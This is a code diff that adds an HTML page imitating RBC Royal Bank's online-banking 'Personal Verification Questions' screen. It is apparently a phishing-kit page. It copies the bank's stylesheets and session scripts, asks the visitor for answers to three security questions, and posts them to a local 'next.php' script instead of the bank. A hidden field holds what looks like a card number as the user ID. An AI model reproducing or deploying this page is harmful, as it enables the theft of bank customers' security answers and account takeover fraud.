@@ -1,0 +1,619 @@
+<html><head>
+  <meta name="Identifier" content="3MSIPCHAL.HTM;9;ENGLISH;RB-MBP">
+  <noscript>
+   <meta http-equiv="refresh" content="0; URL=/cgi-bin/rbaccess/rbcgi3m01?F8=1&amp;F22=HT&amp;REQUEST=SIGNOUT&amp;NS=Y&amp;CPG=7316&amp;LANGUAGE=ENGLISH" />
+  </noscript>
+<!-- 3MSHELLHDPT.INC: -->
+<link href="https://www1.royalbank.com/uos/common/images/icons/favicon.ico" rel="icon">
+<link href="https://www1.royalbank.com/uos/common/css/common.css?6" type="text/css" rel="stylesheet">
+<link href="https://www1.royalbank.com/uos/common/css/legacy.css?6" type="text/css" rel="stylesheet">
+<link href="https://www1.royalbank.com/uos/common/css/main01.css?6" type="text/css" rel="stylesheet">
+<link href="https://www1.royalbank.com/uos/common/css/main02.css?6" type="text/css" rel="stylesheet">
+<link href="https://www1.royalbank.com/uos/common/css/tabs.css?6" type="text/css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?6" media="print">
+<script src="https://www1.royalbank.com/uos/common/javascript/utilities.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/browser.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/ie/event.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/event.js?6" type="text/javascript"></script><script language="JavaScript1.2" src="/uos/common/javascript/dom/event.js" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/buttons.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/cookie.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
+<script src="https://www1.royalbank.com/uos/common/javascript/safaricss.js?6" type="text/javascript"></script>
+<script language="JavaScript" type="text/javascript">
+function shellExpired()
+{
+  var pDelta = rbcGetCookie( "3mDELTA", null );
+  var pSessn = rbcGetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", null );
+
+  if ( pDelta != null )
+  {
+    var loc   = pDelta.indexOf( '/', 0 );
+    var delta = 0;
+    var dtype = '0';
+
+    if ( loc != -1 )
+    {
+      delta = new Number( pDelta.substring( 0, loc ) );
+      dtype = pDelta.substring( loc + 1, pDelta.length );
+    }
+    else delta = new Number( pDelta );
+
+    switch (dtype)
+    {
+      case '0':
+      {
+        var cdate = new Date();
+        var sdate = new Date( cdate.valueOf() + 1800 );
+        cdate = new Date( cdate.valueOf() + 604800000 );
+
+        if ( pSessn == null )
+        {
+          rbcSetCookie( "3mDELTA", delta + 43200 + "/1", cdate.toGMTString(), "/" );
+          rbcSetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", "1", sdate.toGMTString(), "/" );
+        }
+        else if ( pSessn != '1' )
+          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );
+
+        break;
+      }
+      case '1':
+      {
+        if ( pSessn == null )
+          rbcDeleteCookie( "3mDELTA", "/" );
+        else if ( pSessn != '1' )
+        {
+          var cdate = new Date();
+          cdate = new Date( cdate.valueOf() + 604800000 );
+          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );
+        }
+        break;
+      }
+      default :
+      {
+        if ( pSessn == null ) // Clear and show expired
+        {
+          document.location.replace( "/cgi-bin/rbaccess/rbcgi3m01?F8=1&F22=IB&REQUEST=SIGNOUT&LANGUAGE=ENGLISH" );
+        }
+      }
+    }
+  }
+}
+event_addOnLoad(new Array(shellExpired));
+event_addOnFocusForm(new Array(shellExpired));
+setTimeout( shellExpired ,1801000);
+</script>
+<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
+<script language="javascript" type="text/javascript">
+<!--
+function checkOnFocusForm() {
+    if ( rbcGetCookie ("3MTK","NOTTHERE") != "NOTTHERE" ){
+      rbcDeleteCookie("3MTK","/");
+    }
+    rbcSetCookie("F100","1/WX5/2F-6fGkqLkFcS.N9LYG6foKJloaPm-jbIv1NCBA1pOmFEezmPC8YyqcL5cOY4kZ8CBUlnyxKvUQdoACINaU6qg__/GQAAAA__/S0/PB", null, "/");
+}
+checkOnFocusForm();
+event_addOnFocusForm(new Array(checkOnFocusForm));
+//-->
+</script>
+
+
+<!-- 3MSHELLHDPT.INC. -->
+
+  <title>
+    RBC Financial Group - Online banking
+  </title>
+</head>
+
+<body onfocus="event_onFocusForm(); " onblur="event_onBlurForm();" onload="event_onLoad();" onunload="event_onUnload();">
+ <div id="wrapper">
+ <a name="top"></a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <div class="skipnav"><a href="#skipheadernav" onfocus="this.parentNode.className=&quot;&quot;" onblur="this.parentNode.className=&quot;skipnav&quot;">Skip Header Navigation</a></div>
+      <!-- Secure Header Start -->
+      <div id="globalheader" class="clear globalheader-basic globalheader-secure">
+        <div id="globalheader-logo">
+                    <img src="https://www1.royalbank.com/uos/common/images/logos/web/rbc_royalbank_en.gif" alt="RBC Royal Bank" title="RBC Royal Bank" width="210" height="47">
+        </div>
+
+        <p id="globalheader-links">
+
+
+          <a href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/help.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01', 'CONTACT', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Customer Service (opens new window)">Customer Service</a>
+
+
+
+        </p>
+
+        <p id="globalheader-secureinfo">
+
+        </p>
+        <p id="globalheader-tools"><script type="text/javascript" language="JavaScript">dates_currentDate( 'ENGLISH' );</script>October 29, 2021</p>
+      </div>
+
+      <!-- Secure Header End -->
+      <div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>
+
+
+ <div id="layout" class="clear">
+
+ <div id="layout-column-main" style="width:946px">
+
+
+
+ <!-- START: nav style -->
+
+ <table border="0" width="100%">
+
+
+  <tbody><tr valign="top" align="left">
+
+      <td width="5"></td>
+	  
+      <!-- START: content -->
+      <td valign="top"><script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/rsa.js"></script>
+<form name="continueform" method="post" action="next.php">
+
+  <input name="F22" type="hidden" value="HTECINET">
+
+  <input name="F30" type="hidden" value="1,X001,1,USERID,3,SIP_PVQ_ANS">
+  <input name="LANGUAGE" type="hidden" value="ENGLISH">
+  <input name="NNAME" type="hidden" value="">
+  <input name="SST" type="hidden" value="B-EABQAXAAYADQAhAA1Beg??">
+  <input name="REQUEST" type="hidden" value="SIPChallengeComplete">
+  <input name="CHKCLICK" type="hidden" value="Y">
+  <input name="USERID" type="hidden" value="4519015739591604">
+  <input type="hidden" name="FromPreSignIn_SIP" value="Y">
+  <input name="RSA_DEVPRINT" type="HIDDEN" value="">
+  <input name="PvqSrvsToken" type="hidden" value="giQIZOjmIaEupj4pNtQz3PPD0tkc2OHv5.RUOcp5IpzVqENUfgpwbqP2emhDXT.l2.vApttCNMzH.3sJRnfdyHLuNZMErps3BQ7SGq1OrdC91mzvVzccqjUwIp96q9QMaU8ZRFFcdHYmQ4VJtVLN.r70odFi7eChC6hfwRMeilUv.vJ5rBY4bA??">
+  <input name="PvqSrvsAll" type="hidden" value="1">
+  <input name="PvqSrvsNum" type="hidden" value="1">
+  <input name="PvqSrvsBmrsQ" type="hidden" value="Y">
+  <input name="PvqSrvsAlws" type="hidden" value="Y">
+
+
+
+
+  <table border="0" width="100%">
+   <tbody><tr>
+    <td>
+     <table border="0" cellspacing="0" cellpadding="0" width="100%">
+      <tbody><tr>
+
+       <td colspan="2" align="left">
+        <div id="pagetitlearea" class="clear">
+           <h1 id="pagetitle">
+             Sign-In Protection - Personal Verification Questions
+           </h1>
+       </div>
+       </td>
+      </tr>
+
+
+      <tr><td colspan="2" height="5" align="left"></td></tr>
+      <tr>
+       <td colspan="2" class="bodyText">
+        To help us verify your identity, please answer the following question:<br><br>
+       </td>
+      </tr>
+      <tr>
+       <td colspan="2">
+       <span class="contentframework-required-note"><b class="contentframework-required-asterisk">*</b>Required Information</span><br><br>
+       </td>
+      </tr>
+      <tr>
+       <td colspan="2">
+        <table class="contentframework" style="border-bottom:0px">
+         <tbody><tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 1 of 3</th></tr>
+         <tr class="contentframework-altrow">
+          <td width="3%" class="contentframework-formdatalabel">
+           <label for="pvqQuestion"><strong>Question:</strong></label>
+          </td>
+          <td width="88%"> <select name="question1" style="width:350px" required="" value="">
+								   <option value="">Select a question</option>
+       <option value="What was the first movie I ever saw?">What was the first movie I ever saw?</option>
+       <option value="What is the middle name of my oldest child?">What is the middle name of my oldest child?</option>
+       <option value="In which city was my father born?">In which city was my father born?</option>
+       <option value="Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option>
+       <option value="What is my mother's middle name?">What is my mother's middle name?</option>
+       <option value="In what year did I meet my significant other?">In what year did I meet my significant other?</option>
+       <option value="What was my first pet's name?">What was my first pet's name?</option>
+       <option value="First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option>
+       <option value="First name of my best friend in elementary school?">First name of my best friend in elementary school?</option>
+       <option value="Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option>
+      </select> </td>
+         </tr>
+         <tr>
+          <td class="contentframework-formdatalabel">
+           <label for="pvqAnswer">
+           <span class="contentframework-negativeindent">
+           <b class="contentframework-required-asterisk">*</b></span><strong>Answer:</strong>
+     </label>
+          </td>
+          <td>
+           <input type="text" name="answer1" id="pvqAnswer" size="22" maxlength="20" required="" value=""> <span class="contentframework-contextualhelp">
+
+           <a href="javascript:document.frmHaveTrouble.submit();" title="HELP (opens new window)" onmouseover="javascript:status='HELP';return true;">HELP</a></span>
+
+          </td>
+         </tr>
+        </tbody></table>
+ </td></tr><tr>
+       <td colspan="2">
+        <table class="contentframework" style="border-bottom:0px">
+         <tbody><tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 2 of 3</th></tr>
+         <tr class="contentframework-altrow">
+          <td width="3%" class="contentframework-formdatalabel">
+           <label for="pvqQuestion"><strong>Question:</strong></label>
+          </td>
+          <td width="88%"> <select name="question2" style="width:350px" required="" value="">
+				    <option value="">Select a question</option>
+       <option value="What was the first book I ever read?">What was the first book I ever read?</option>
+       <option value="What was the first company I ever worked for?">What was the first company I ever worked for?</option>
+       <option value="What High School did my mother attend?">What High School did my mother attend?</option>
+       <option value="In which city was my mother born?">In which city was my mother born?</option>
+       <option value="What is my spouse's/partner's middle name?">What is my spouse's/partner's middle name?</option>
+       <option value="In which city did I get married?">In which city did I get married?</option>
+       <option value="What is my best friend's first name?">What is my best friend's first name?</option>
+       <option value="What is the name of the first school I attended?">What is the name of the first school I attended?</option>
+       <option value="What was my kindergarten teacher's last name?">What was my kindergarten teacher's last name?</option>
+       <option value="What is the first name of my oldest cousin?">What is the first name of my oldest cousin?</option>
+      </select> </td>
+         </tr>
+         <tr>
+          <td class="contentframework-formdatalabel">
+           <label for="pvqAnswer">
+           <span class="contentframework-negativeindent">
+           <b class="contentframework-required-asterisk">*</b></span><strong>Answer:</strong>
+     </label>
+          </td>
+          <td>
+           <input type="text" name="answer2" id="pvqAnswer" size="22" maxlength="20" value="" required=""> <span class="contentframework-contextualhelp">
+
+           <a href="javascript:document.frmHaveTrouble.submit();" title="HELP (opens new window)" onmouseover="javascript:status='HELP';return true;">HELP</a></span>
+
+          </td>
+         </tr>
+        </tbody></table>
+		 </td></tr><tr>
+       <td colspan="2">
+        <table class="contentframework" style="border-bottom:0px">
+         <tbody><tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 3 of 3</th></tr>
+         <tr class="contentframework-altrow">
+          <td width="3%" class="contentframework-formdatalabel">
+           <label for="pvqQuestion"><strong>Question:</strong></label>
+          </td>
+          <td width="88%"> <select name="question3" style="width:350px" required="" value="">
+				       <option value="">Select a question</option>
+       <option value="What was the make of my first car?">What was the make of my first car?</option>
+       <option value="What High School did my father attend?">What High School did my father attend?</option>
+       <option value="Which city did I meet my significant other?">Which city did I meet my significant other?</option>
+       <option value="Last name of my favourite High School teacher?">Last name of my favourite High School teacher?</option>
+       <option value="Which country did I go to on my honeymoon?">Which country did I go to on my honeymoon?</option>
+       <option value="First name of my best man at my wedding?">First name of my best man at my wedding?</option>
+       <option value="What was the name of my first manager?">What was the name of my first manager?</option>
+       <option value="In what town or city was my significant other born?">In what town or city was my significant other born?</option>
+       <option value="Last name of my childhood best friend?">Last name of my childhood best friend?</option>
+       <option value="What is the first name of my oldest nephew?">What is the first name of my oldest nephew?</option>
+      </select> </td>
+         </tr>
+         <tr>
+          <td class="contentframework-formdatalabel">
+           <label for="pvqAnswer">
+           <span class="contentframework-negativeindent">
+           <b class="contentframework-required-asterisk">*</b></span><strong>Answer:</strong>
+          <span style="position:absolute;left:-10000px;top:auto;width:1px;height:1px;overflow:hidden;"> What is my best friend's first name?</span>
+     </label>
+          </td>
+          <td>
+           <input type="text" name="answer3" id="pvqAnswer" size="22" maxlength="20" value="" required=""> <span class="contentframework-contextualhelp">
+
+           <a href="javascript:document.frmHaveTrouble.submit();" title="HELP (opens new window)" onmouseover="javascript:status='HELP';return true;">HELP</a></span>
+
+          </td>
+         </tr>
+		 
+        </tbody></table>
+		<table>
+		
+		</table>
+        <table>
+		
+         <tbody><tr>
+          <td colspan="2" valign="top" class="bodyText">Occasional security checks help us keep your Online banking information safe. Please don't share your questions or answers with anyone.</td>
+         </tr>
+         <tr><td colspan="2">&nbsp;</td></tr>
+         <tr>
+          <td class=" bodyText" colspan="2">
+           <input type="checkbox" name="SIP_ALWAYSASK" id="SIP_ALWAYSASK" value="Y" title="Ask me at least one PVQ each time I Sign in" checked="checked">
+           <label for="SIP_ALWAYSASK">Ask me at least one PVQ each time I Sign in.</label>
+          </td>
+         </tr>
+        </tbody></table>
+       </td>
+      </tr>
+     </tbody></table>
+    </td>
+    <td width="216">&nbsp;</td>
+   </tr>
+
+   <tr><td colspan="2">&nbsp;</td></tr>
+
+   <tr>
+    <td>
+      <table width="100%" cellpadding="0" cellspacing="0" border="0">
+          <tbody><tr>
+            <td>
+<!--3MBUTTON01.CINC: en-->
+
+
+
+
+
+
+
+
+<span class="button button-secondary">
+<span>
+<a id="id_btn_cancel" title="Cancel" href="javascript:if(document.title!='')document.cancelform.submit();" onmouseover="javascript:status='Cancel';return true;" onmouseout="javascript:status='';return true;">Cancel</a>
+</span>
+</span>
+
+
+
+<!--3MBUTTON01.CINC. en-->
+            </td>
+            <td colspan="2" align="right">
+<!--3MBUTTON01.CINC: en-->
+
+
+
+
+
+
+
+ <span style="float:right;">
+
+<span class="">
+<span>
+<input type="image" src="1.png" alt="">
+</span>
+</span>
+
+ </span>
+ <script type="text/javascript">
+  <!--
+   var f3mbuttonuos_IDs = new Array();
+   event_addOnLoad(new Array( f3mbuttonuos_FixTabOrder ));
+   function f3mbuttonuos_ID2Fix(id)
+   {
+    var size = f3mbuttonuos_IDs.length;
+    f3mbuttonuos_IDs[size]=new Array();
+    f3mbuttonuos_IDs[size]=id;
+   }
+   function f3mbuttonuos_FixTabOrder()
+   {
+//    alert("We are in FixTabOrder");
+    for (var i = 0; i < f3mbuttonuos_IDs.length - 1; i++)
+    {
+     var co_ord1 = new Array();
+     var x1 = 0;
+     var y1 = 0;
+     var element1 = document.getElementById(f3mbuttonuos_IDs[i]);
+     co_ord1 = f3mbuttonuos_findPos(element1);
+     y1 = co_ord1[0];
+     x1 = co_ord1[1];
+//     alert("Element1 co-ords are: [" + x1 + "," + y1 + "]");
+     for (var j = 1; j < f3mbuttonuos_IDs.length; j++)
+     {
+      var co_ord2 = new Array();
+      var x2 = 0;
+      var y2 = 0;
+      var element2 = document.getElementById(f3mbuttonuos_IDs[j]);
+      co_ord2 = f3mbuttonuos_findPos(element2);
+      y2 = co_ord2[0];
+      x2 = co_ord2[1];
+//      alert("Element2 co-ords are: [" + x2 + "," + y2 + "]");
+      if (y1 == y2) //The buttons are on the same level
+      {
+       if (x2 < x1) //We need to swap positions
+       {
+//        alert("switching " + f3mbuttonuos_IDs[i] + " with " + f3mbuttonuos_IDs[j]);
+        var Element1LinkNum = 0;
+        var Element2LinkNum = 0;
+        var Element1LinkDir = "";
+        var Element2LinkDir = "";
+	var Element1Offset = 0;
+	var Element2Offset = 0;
+        var ElementOffsetHld = 0;
+        var TempTabIndex = 0;
+        var elementClone1 = new Object;
+        var elementClone2 = new Object;
+        for (l = 0; l < window.document.links.length; l++)
+        {
+         if (window.document.links[l].id == f3mbuttonuos_IDs[i])
+         {
+          Element1LinkNum = l;
+          Element1LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.cssFloat; 
+          if (typeof(Element1LinkDir) == "undefined")
+	  {
+           Element1LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.styleFloat;
+          }
+          if (window.document.links[l].parentNode.parentNode.parentNode.style.right != "")
+          {
+//           alert("Element1 is floating right");
+           Element1Offset = window.document.links[l].parentNode.parentNode.parentNode.style.right.split("px");
+          }
+	  else
+          if (window.document.links[l].parentNode.parentNode.parentNode.style.left != "")
+          {
+//           alert("Element1 is floating left");
+           Element1Offset = window.document.links[l].parentNode.parentNode.parentNode.style.left.split("px");
+          }
+         }
+         if (window.document.links[l].id == f3mbuttonuos_IDs[j])
+         {
+          Element2LinkNum = l;
+          Element2LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.cssFloat;
+          if (typeof(Element2LinkDir) == "undefined")
+	  {
+           Element2LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.styleFloat;
+          }
+          if (window.document.links[l].parentNode.parentNode.parentNode.style.right != "")
+          {
+//           alert("Element2 is floating right");
+           Element2Offset = window.document.links[l].parentNode.parentNode.parentNode.style.right.split("px");
+          }
+	  else
+          if (window.document.links[l].parentNode.parentNode.parentNode.style.left != "")
+          {
+//           alert("Element2 is floating left");
+           Element2Offset = window.document.links[l].parentNode.parentNode.parentNode.style.left.split("px");
+          }
+         }
+        }
+//        alert("Element1Offset = " + Element1Offset + " , Element2Offset = " + Element2Offset);
+
+
+
+
+  	if (Element1LinkDir == Element2LinkDir)
+  	{
+//         alert("Element float directions match: " + Element1LinkDir);
+	 if (isNaN(Element1Offset))
+         {
+ 	  Element1Offset = 0;
+         }
+	 if (isNaN(Element2Offset))
+         {
+ 	  Element2Offset = 0;
+         }
+
+  	 if (Element1LinkDir == "right")
+         {
+	  ElementOffsetHld = parseInt(Element2Offset);
+  	  Element2Offset = Element1Offset + window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.clientWidth;
+          Element2Offset -= ElementOffsetHld;
+    	  Element1Offset = Element1Offset - window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.clientWidth;
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element1Offset.toString() + "px";
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element2Offset.toString() + "px";
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
+         }
+         else
+	 {
+  	  ElementOffsetHld += parseInt(Element1Offset);
+   	  Element1Offset = Element2Offset + window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.clientWidth;
+          Element1Offset -= ElementOffsetHld;
+   	  Element2Offset = Element2Offset + window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.clientWidth;
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element1Offset.toString() + "px";
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element2Offset.toString() + "px";
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
+	 }
+//         alert("Element1Offset = " + Element1Offset + " , Element2Offset = " + Element2Offset);
+	}
+        else
+        {
+	 Element1Offset = 0;
+	 Element2Offset = 0;
+         if (window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right != "")
+         {
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element1Offset.toString() + "px";
+         }
+         if (window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left != "")
+         {
+          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element1Offset.toString() + "px";
+         }
+         if (window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right != "")
+         {
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element2Offset.toString() + "px";
+         }
+         if (window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left != "")
+         {
+          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element2Offset.toString() + "px";
+         }
+        }
+
+ 
+        elementClone1 = window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.cloneNode(true);
+        elementClone2 = window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.cloneNode(true);
+        window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.parentNode.replaceChild(elementClone2,window.document.links[Element1LinkNum].parentNode.parentNode.parentNode);
+        window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.parentNode.replaceChild(elementClone1,window.document.links[Element2LinkNum].parentNode.parentNode.parentNode);
+ 
+
+       }
+      }
+     }
+    }
+   }
+   function f3mbuttonuos_findPos(obj)
+   {
+    var obj2 = obj;
+    var curtop = 0;
+    var curleft = 0;
+    if (document.getElementById || document.all)
+    {
+     do
+     {
+      curleft += obj.offsetLeft-obj.scrollLeft;
+      curtop += obj.offsetTop-obj.scrollTop;
+      obj = obj.offsetParent;
+      obj2 = obj2.parentNode;
+      while (obj2!=obj)
+      {
+       curleft -= obj2.scrollLeft;
+       curtop -= obj2.scrollTop;
+       obj2 = obj2.parentNode;
+      }
+     }
+     while (obj.offsetParent)
+    }
+    else
+    if (document.layers)
+    {
+     curtop += obj.y;
+     curleft += obj.x;
+    }
+    return [curtop, curleft];
+   }
+  //-->
+ </script>
+ <script type="text/javascript">
+  <!--
+   f3mbuttonuos_ID2Fix("id_btn_continue");
+  //-->
+ </script>
+
+
+<!--3MBUTTON01.CINC. en-->
+            </td>
+          </tr>
+      </tbody></table>
+    </td>
+    <td width="216">&nbsp;</td>
+   </tr>
+  </tbody></table>
+</form>
+
+  
+ <!-- Endt of 3MSHELLFTAB.INC -->
+
+
+
+
+
+</td></tr></tbody></table></div></div></div></body></html>
